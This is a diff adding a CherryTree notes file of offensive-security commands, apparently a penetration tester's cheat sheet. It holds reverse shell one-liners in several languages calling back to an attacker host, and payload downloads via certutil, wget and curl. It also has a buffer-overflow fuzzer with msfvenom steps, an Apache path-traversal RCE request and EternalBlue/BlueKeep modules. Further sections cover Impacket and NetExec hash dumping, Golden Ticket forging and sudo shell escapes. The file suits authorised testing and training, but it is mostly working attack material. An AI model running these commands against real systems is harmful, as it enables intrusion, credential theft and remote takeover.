@@ -1,0 +1,299 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Offensive Security" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+    <rich_text></rich_text>
+
+    <node name="09. Shells, File Transfer &amp; Utilities" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+      <rich_text></rich_text>
+
+      <node name="Reverse Shells" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1
+# Bash reverse shell
+--------------------------------------------------
+python3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;LHOST&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;
+# Python3 reverse shell
+--------------------------------------------------
+php -r &apos;$sock=fsockopen(&quot;&lt;LHOST&gt;&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
+# PHP reverse shell
+--------------------------------------------------
+powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&apos;&lt;LHOST&gt;&apos;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
+# PowerShell reverse shell
+--------------------------------------------------
+nc -e /bin/sh &lt;LHOST&gt; 4444
+# Netcat reverse shell (traditional)
+--------------------------------------------------
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; 4444 &gt;/tmp/f
+# Netcat FIFO reverse shell (modern Linux)
+--------------------------------------------------
+perl -e &apos;use Socket;$i=&quot;&lt;LHOST&gt;&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);}&apos;
+# Perl reverse shell
+--------------------------------------------------
+ruby -rsocket -e&apos;f=TCPSocket.open(&quot;&lt;LHOST&gt;&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;
+# Ruby reverse shell
+--------------------------------------------------
+</rich_text>
+      </node>
+
+      <node name="Shell Upgrades &amp; Stabilization" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;
+# Upgrade to interactive PTY shell
+--------------------------------------------------
+# Press Ctrl+Z to background the shell
+stty raw -echo; fg
+# Disable local terminal echo and bring shell to foreground
+--------------------------------------------------
+export TERM=xterm
+# Enable clear screen and standard terminal shortcuts
+--------------------------------------------------
+stty rows 48 columns 190
+# Match shell dimensions to local terminal window
+--------------------------------------------------
+rlwrap nc -lvnp 4444
+# Start listener with readline wrapper for arrow-key history support
+--------------------------------------------------
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+# Attacker: Fully stable socat listener
+--------------------------------------------------
+socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:&lt;LHOST&gt;:4444
+# Target: Fully stable socat reverse shell
+--------------------------------------------------
+</rich_text>
+      </node>
+
+      <node name="File Transfer" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>python3 -m http.server 80
+# Linux: Start quick HTTP server for file hosting
+--------------------------------------------------
+impacket-smbserver share . -smb2support
+# Linux: Start SMB server for Windows file transfers
+--------------------------------------------------
+certutil -urlcache -split -f http://&lt;LHOST&gt;/file.exe C:\Temp\file.exe
+# Windows: Download file via certutil
+--------------------------------------------------
+powershell -c &quot;Invoke-WebRequest http://&lt;LHOST&gt;/file.exe -OutFile C:\Temp\file.exe&quot;
+# Windows: Download file via PowerShell
+--------------------------------------------------
+copy \\&lt;LHOST&gt;\share\file.exe C:\Temp\
+# Windows: Copy file from attacker SMB share
+--------------------------------------------------
+wget http://&lt;LHOST&gt;/file -O /tmp/file
+# Linux: Download file via wget
+--------------------------------------------------
+curl http://&lt;LHOST&gt;/file -o /tmp/file
+# Linux: Download file via curl
+--------------------------------------------------
+scp /tmp/file user@&lt;TARGET_IP&gt;:/tmp/
+# Linux: Push file to target via SCP
+--------------------------------------------------
+</rich_text>
+      </node>
+    </node>
+
+    <node name="10. Exploit Development &amp; CVEs" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+      <rich_text></rich_text>
+
+      <node name="Windows x86 Buffer Overflow" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>import socket, time
+payload = b&quot;A&quot; * 100
+while True:
+    try:
+        s = socket.socket()
+        s.connect((&apos;&lt;TARGET_IP&gt;&apos;, &lt;PORT&gt;))
+        s.send(b&quot;COMMAND &quot; + payload + b&quot;\r&quot;)
+        s.close()
+        payload += b&quot;A&quot; * 100
+    except:
+        print(f&quot;[!] Crashed at ~{len(payload)} bytes&quot;)
+        break
+# Step 1: Fuzzing script to find crash threshold
+--------------------------------------------------
+msf-pattern_create -l &lt;CRASH_LENGTH&gt;
+# Step 2: Generate unique cyclic pattern
+--------------------------------------------------
+msf-pattern_offset -l &lt;CRASH_LENGTH&gt; -q &lt;EIP_VALUE&gt;
+# Step 2: Calculate exact EIP offset
+--------------------------------------------------
+!mona bytearray -b &quot;\x00&quot;
+# Step 3: Generate byte array in Immunity Debugger
+--------------------------------------------------
+!mona compare -f C:\mona\bytearray.bin -a &lt;ESP_ADDRESS&gt;
+# Step 3: Identify bad characters corrupting memory
+--------------------------------------------------
+!mona jmp -r esp -cpb &quot;\x00\x0a\x0d&quot;
+# Step 4: Find JMP ESP instruction pointer
+--------------------------------------------------
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 EXITFUNC=thread -b &quot;\x00&quot; -f python
+# Step 5: Generate final payload excluding bad chars
+--------------------------------------------------
+</rich_text>
+      </node>
+
+      <node name="Common High-Value CVEs" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>nmap --script smb-vuln-ms17-010 -p 445 &lt;TARGET_IP&gt;
+# MS17-010 EternalBlue (Win7/2008 R2 SMBv1) -&gt; SYSTEM
+--------------------------------------------------
+msfconsole -x &quot;use exploit/windows/smb/ms17_010_eternalblue&quot;
+# MS17-010 Metasploit module
+--------------------------------------------------
+curl -s &apos;http://&lt;TARGET_IP&gt;/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&apos; -d &apos;echo;id&apos;
+# CVE-2021-41773 Apache 2.4.49 Path Traversal / RCE
+--------------------------------------------------
+msfconsole -x &quot;use exploit/windows/rdp/cve_2019_0708_bluekeep_rce&quot;
+# CVE-2019-0708 BlueKeep (Win7/2008 RDP) -&gt; SYSTEM (High crash risk)
+--------------------------------------------------
+searchsploit &lt;SERVICE_NAME&gt; &lt;VERSION&gt;
+# Local exploit database search
+--------------------------------------------------
+</rich_text>
+      </node>
+    </node>
+
+    <node name="11. Ultimate Quick Reference" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+      <rich_text></rich_text>
+
+      <node name="Impacket Cheatsheet" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt; -just-dc
+# DCSync and dump NTDS.dit hashes
+--------------------------------------------------
+psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt;
+# Remote execution via SMB named pipes (Ports 445)
+--------------------------------------------------
+wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt;
+# Remote execution via WMI (Port 135)
+--------------------------------------------------
+smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt;
+# Remote execution via SMB service creation (Port 445)
+--------------------------------------------------
+atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt; &quot;whoami&quot;
+# Remote execution via Task Scheduler (Port 445)
+--------------------------------------------------
+GetUserSPNs.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt; -dc-ip &lt;DC_IP&gt; -request
+# Kerberoasting: Request TGS tickets for offline cracking
+--------------------------------------------------
+GetNPUsers.py &lt;DOMAIN&gt;/ -usersfile users.txt -dc-ip &lt;DC_IP&gt; -no-pass
+# AS-REP Roasting: Request TGTs for users without pre-auth
+--------------------------------------------------
+getTGT.py &lt;DOMAIN&gt;/&lt;USER&gt; -hashes :&lt;NTLM_HASH&gt; -dc-ip &lt;DC_IP&gt;
+# Request TGT using Pass-The-Hash
+--------------------------------------------------
+ticketer.py -nthash &lt;KRBTGT_HASH&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt; Administrator
+# Forge Golden Ticket
+--------------------------------------------------
+</rich_text>
+      </node>
+
+      <node name="NetExec (nxc) Cheatsheet" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>nxc smb &lt;TARGET_IP&gt; -u user -p pass --shares
+# Enumerate SMB shares and access rights
+--------------------------------------------------
+nxc smb &lt;TARGET_IP&gt; -u user -p pass --sam
+# Dump SAM database hashes
+--------------------------------------------------
+nxc smb &lt;TARGET_IP&gt; -u user -p pass --lsa
+# Dump LSA secrets (plaintext creds)
+--------------------------------------------------
+nxc smb &lt;DC_IP&gt; -u user -p pass --ntds
+# DCSync and dump all domain hashes
+--------------------------------------------------
+nxc smb &lt;TARGET_IP&gt; -u user -p pass -M spider_plus
+# Spider and map all readable share contents
+--------------------------------------------------
+nxc winrm &lt;TARGET_IP&gt; -u user -p pass
+# Test WinRM authentication and execute commands
+--------------------------------------------------
+nxc mssql &lt;TARGET_IP&gt; -u sa -p pass
+# Test MSSQL authentication and execute queries
+--------------------------------------------------
+nxc ldap &lt;DC_IP&gt; -u user -p pass --bloodhound -c All
+# Collect BloodHound data via LDAP
+--------------------------------------------------
+</rich_text>
+      </node>
+
+      <node name="Windows System Commands" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>systeminfo
+# View OS version, architecture, and hotfixes
+--------------------------------------------------
+wmic qfe list brief
+# List installed patches and updates
+--------------------------------------------------
+net user
+# List local users
+--------------------------------------------------
+net localgroup administrators
+# List local administrators
+--------------------------------------------------
+net accounts
+# View password and lockout policies
+--------------------------------------------------
+tasklist /SVC
+# List running processes and associated services
+--------------------------------------------------
+netstat -ano
+# List active network connections and listening ports
+--------------------------------------------------
+whoami /all
+# View current user SID, groups, and token privileges
+--------------------------------------------------
+wmic ntdomain get Caption,DomainName,DomainControllerAddress
+# Dump domain and trust layout via WMI
+--------------------------------------------------
+</rich_text>
+      </node>
+
+      <node name="Key File Locations" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>/etc/passwd
+# Linux: User accounts database
+--------------------------------------------------
+/etc/shadow
+# Linux: Password hashes (requires root)
+--------------------------------------------------
+/var/log/auth.log
+# Linux: Authentication logs (target for log poisoning)
+--------------------------------------------------
+C:\Windows\System32\config\SAM
+# Windows: Local account password hashes
+--------------------------------------------------
+C:\Windows\System32\config\SYSTEM
+# Windows: Boot key required to decrypt SAM
+--------------------------------------------------
+C:\Windows\Panther\unattend.xml
+# Windows: Automated deployment credentials
+--------------------------------------------------
+C:\inetpub\wwwroot\web.config
+# Windows/IIS: Database connection strings
+--------------------------------------------------
+$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# Windows: PowerShell command history
+--------------------------------------------------
+</rich_text>
+      </node>
+
+      <node name="GTFOBins Quick Reference" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>sudo find . -exec /bin/bash \; -p
+# Sudo: Find shell escape
+--------------------------------------------------
+sudo vim -c &apos;!/bin/bash&apos;
+# Sudo: Vim shell escape
+--------------------------------------------------
+sudo awk &apos;BEGIN {system(&quot;/bin/bash&quot;)}&apos;
+# Sudo: Awk shell escape
+--------------------------------------------------
+sudo python3 -c &apos;import os; os.system(&quot;/bin/bash&quot;)&apos;
+# Sudo: Python shell escape
+--------------------------------------------------
+sudo env /bin/bash
+# Sudo: Env shell escape
+--------------------------------------------------
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+# Sudo: Tar checkpoint shell escape
+--------------------------------------------------
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# Docker group breakout to host root
+--------------------------------------------------
+</rich_text>
+      </node>
+    </node>
+
+  </node>
+</cherrytree>
